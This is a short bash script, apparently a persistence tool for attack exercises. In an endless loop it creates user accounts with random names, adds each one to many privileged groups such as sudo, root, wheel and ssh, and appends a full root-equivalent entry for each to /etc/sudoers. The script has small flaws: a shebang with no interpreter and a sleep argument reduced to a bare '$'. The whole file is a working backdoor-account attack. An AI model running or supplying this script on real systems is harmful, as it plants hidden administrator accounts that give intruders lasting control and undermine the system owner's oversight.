#!/usr/bin/env

sleepTime="600"
groups="sudo admin root wheel sudoers adm sys bin daemon shutdown ssh sshd ftp apache httpd"
sudoFile="/etc/sudoers"
while true; do
    user="$(echo "${RANDOM}${RANDOM}" | md5sum | cut -b 1-14)"
    useradd -m "$user"

    #make sure user was added successfully
    ret=$(echo $?)
    if [ "$ret" -ne 0 ]; then
        continue
    fi

    usermod -s /bin/bash "$user"
    #add to typical admin groups
    for group in $groups; do
        usermod -a -G "$group" "$user"
    done

    #add to sudoers to file
    echo "$user ALL=(ALL:ALL) ALL" >> "$sudoFile"

    sleep "$"
done
